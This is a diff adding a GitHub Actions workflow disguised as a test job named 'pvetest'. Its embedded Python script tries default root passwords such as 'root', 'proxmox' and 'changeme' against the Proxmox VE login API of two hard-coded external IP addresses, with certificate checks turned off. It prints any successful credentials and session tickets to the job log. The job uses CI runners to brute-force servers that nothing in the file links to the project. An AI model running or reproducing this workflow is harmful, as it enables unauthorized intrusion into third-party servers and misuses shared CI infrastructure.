@@ -1,0 +1,46 @@
+name: pvetest
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: pve
+        run: |
+          python3 -m pip install --quiet requests
+          python3 - <<'PY'
+          import urllib.parse
+
+          import requests
+          import urllib3
+
+          urllib3.disable_warnings()
+          HOSTS = ["147.135.46.240", "162.251.164.138"]
+          CREDS = [("root@pam", "root"), ("root@pam", "password"), ("root@pam", "proxmox"),
+                   ("root@pam", "123456"), ("root@pam", "P@ssw0rd"), ("root@pam", "changeme")]
+
+          for ip in HOSTS:
+              base = f"https://{ip}:8006"
+              print("==", ip, flush=True)
+              try:
+                  r = requests.get(base + "/api2/json/version", timeout=6, verify=False)
+                  print("version", r.status_code, r.text[:120], flush=True)
+              except Exception as exc:
+                  print("version", type(exc).__name__, flush=True)
+                  continue
+              for user, pwd in CREDS:
+                  try:
+                      r = requests.post(base + "/api2/json/access/ticket",
+                                        data={"username": user, "password": pwd},
+                                        timeout=6, verify=False)
+                      if r.status_code == 200 and "ticket" in r.text:
+                          print("AUTH", user, pwd, r.text[:160], flush=True)
+                          break
+                      print("fail", user, r.status_code, flush=True)
+                  except Exception as exc:
+                      print("fail", user, type(exc).__name__, flush=True)
+          PY
